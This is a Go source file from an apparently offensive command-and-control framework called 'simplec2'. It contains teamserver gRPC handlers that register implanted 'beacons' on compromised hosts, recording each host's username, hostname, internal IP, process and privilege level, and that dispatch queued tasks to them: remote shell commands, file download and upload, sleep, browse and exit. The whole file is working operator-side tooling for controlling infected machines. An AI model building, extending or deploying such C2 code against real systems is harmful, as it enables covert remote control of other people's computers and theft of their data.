package main

import (
	"context"
	"encoding/json"
	"os"
	"time"

	"github.com/google/uuid"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"
	"simplec2/pkg/bridge"
	"simplec2/pkg/logger"
	"simplec2/teamserver/data"
)

func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest) (*bridge.StageBeaconResponse, error) {
	logger.Infof("Received StageBeacon from listener: %s", in.ListenerName)

	// Extract remote address from gRPC context
	var remoteAddr string
	p, ok := peer.FromContext(ctx)
	if ok {
		remoteAddr = p.Addr.String()
	}

	beacon := data.Beacon{
		BeaconID:      uuid.New().String(),
		Listener:      in.ListenerName,
		RemoteAddr:    remoteAddr,
		Status:        "active",
		FirstSeen:     time.Now(),
		LastSeen:      time.Now(),
		Sleep:         5, // Default sleep
		OS:            in.Metadata.Os,
		Arch:          in.Metadata.Arch,
		Username:      in.Metadata.Username,
		Hostname:      in.Metadata.Hostname,
		InternalIP:    in.Metadata.InternalIp,
		ProcessName:   in.Metadata.ProcessName,
		PID:           in.Metadata.Pid,
		IsHighIntegrity: in.Metadata.IsHighIntegrity,
	}

	if err := s.Store.CreateBeacon(&beacon); err != nil {
		logger.Errorf("Error saving beacon to database: %v", err)
		return nil, err
	}

	logger.Infof("New beacon with ID %s saved to database", beacon.BeaconID)

	// Broadcast the new beacon event via WebSocket
	event := struct {
		Type    string      `json:"type"`
		Payload data.Beacon `json:"payload"`
	}{
		Type:    "BEACON_NEW",
		Payload: beacon,
	}
	eventBytes, err := json.Marshal(event)
	if err != nil {
		logger.Errorf("Error marshalling new beacon event: %v", err)
	} else {
		s.Hub.Broadcast(eventBytes)
		logger.Infof("Broadcasted BEACON_NEW event for %s", beacon.BeaconID)
	}

	return &bridge.StageBeaconResponse{
		AssignedBeaconId: beacon.BeaconID,
	}, nil
}

func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequest) (*bridge.CheckInBeaconResponse, error) {
	logger.Infof("Received CheckInBeacon from beacon: %s", in.BeaconId)

	beacon, err := s.Store.GetBeacon(in.BeaconId)
	if err != nil {
		logger.Warnf("Beacon %s not found during check-in: %v. Assuming exited.", in.BeaconId, err)
		return nil, status.Errorf(codes.NotFound, "beacon not found")
	}

	// Update beacon's last seen time
	beacon.LastSeen = time.Now()

	// If beacon is in 'exiting' state, send it an exit task.
	if beacon.Status == "exiting" {
		logger.Infof("Beacon %s is in 'exiting' state. Sending final exit task.", in.BeaconId)
		var grpcTasks []*bridge.Task
		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    uuid.New().String(),
			CommandId: 4, // CommandID for exit
			Arguments: nil,
		})
		s.Store.UpdateBeacon(beacon) // Save updated LastSeen
		return &bridge.CheckInBeaconResponse{
			Tasks: grpcTasks,
		}, nil
	}

	s.Store.UpdateBeacon(beacon)

	// Broadcast the check-in event via WebSocket
	checkinEvent := struct {
		Type    string `json:"type"`
		Payload struct {
			BeaconID string    `json:"beacon_id"`
			LastSeen time.Time `json:"last_seen"`
		} `json:"payload"`
	}{
		Type: "BEACON_CHECKIN",
		Payload: struct {
			BeaconID string    `json:"beacon_id"`
			LastSeen time.Time `json:"last_seen"`
		}{
			BeaconID: beacon.BeaconID,
			LastSeen: beacon.LastSeen,
		},
	}
	eventBytes, err := json.Marshal(checkinEvent)
	if err != nil {
		logger.Errorf("Error marshalling check-in event: %v", err)
	} else {
		s.Hub.Broadcast(eventBytes)
	}

	// Find queued tasks for this beacon
	var grpcTasks []*bridge.Task

	allTasks, err := s.Store.GetTasksByBeaconID(in.BeaconId)
	if err != nil {
		logger.Errorf("Error getting tasks for beacon %s: %v", in.BeaconId, err)
		return nil, err
	}

	for _, dbTask := range allTasks {
		if dbTask.Status != "queued" {
			continue
		}

		var cmdID uint32
		var taskArgs []byte

		switch dbTask.Command {
		case "shell":
			cmdID = 1
			taskArgs = []byte(dbTask.Arguments)
		case "download":
			cmdID = 2
			if dbTask.Arguments == "" {
				logger.Warnf("Download task %s has no arguments", dbTask.TaskID)
				taskArgs = nil
			} else {
				var downloadArgs struct {
					Source      string `json:"source"`
					Destination string `json:"destination"`
				}
				if err := json.Unmarshal([]byte(dbTask.Arguments), &downloadArgs); err != nil {
					logger.Errorf("Failed to parse download arguments for task %s: %v", dbTask.TaskID, err)
					taskArgs = nil
				} else {
					sourcePath := downloadArgs.Source

					fileInfo, err := os.Stat(sourcePath)
					if err != nil {
						logger.Errorf("Failed to get file info for %s: %v", sourcePath, err)
						// Optionally, update task to 'error' state here.
						continue
					}

					// Prepare arguments for the beacon to initiate chunked download
					beaconArgs := struct {
						Source      string `json:"source"`
						Destination string `json:"destination"`
						FileSize    int64  `json:"file_size"`
						ChunkSize   int    `json:"chunk_size"`
					}{
						Source:      downloadArgs.Source, // Keep original source for beacon's reference if needed
						Destination: downloadArgs.Destination,
						FileSize:    fileInfo.Size(),
						ChunkSize:   ChunkSize, // Use the constant defined in grpc_file_handlers
					}
					taskArgs, _ = json.Marshal(beaconArgs)
					logger.Infof("Prepared chunked download task for %s (%d bytes)", downloadArgs.Destination, fileInfo.Size())
				}
			}
		case "upload":
			cmdID = 3
			taskArgs = []byte(dbTask.Arguments)
		case "exit":
			cmdID = 4
			taskArgs = nil
		case "sleep":
			cmdID = 5
			// 解析sleep参数，验证范围 (1-3600秒)
			logger.Infof("Processing sleep task %s: Arguments=%q (len=%d)", dbTask.TaskID, dbTask.Arguments, len(dbTask.Arguments))
			if dbTask.Arguments != "" {
				taskArgs = []byte(dbTask.Arguments)
			} else {
				// 默认sleep值
				taskArgs = []byte("5")
			}
			logger.Debugf("Sleep task %s: taskArgs=%q (len=%d)", dbTask.TaskID, taskArgs, len(taskArgs))
		case "browse":
			cmdID = 6
			taskArgs = []byte(dbTask.Arguments)
		default:
			logger.Warnf("Unknown command type for task %s: %s", dbTask.TaskID, dbTask.Command)
			continue
		}

		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    dbTask.TaskID,
			CommandId: cmdID,
			Arguments: taskArgs,
		})

		// Update task status to dispatched
		dbTask.Status = "dispatched"
		s.Store.UpdateTask(&dbTask)
	}

	return &bridge.CheckInBeaconResponse{
		Tasks: grpcTasks,
		// NewSleep 字段不再使用，sleep间隔现在通过任务系统控制
	}, nil
}
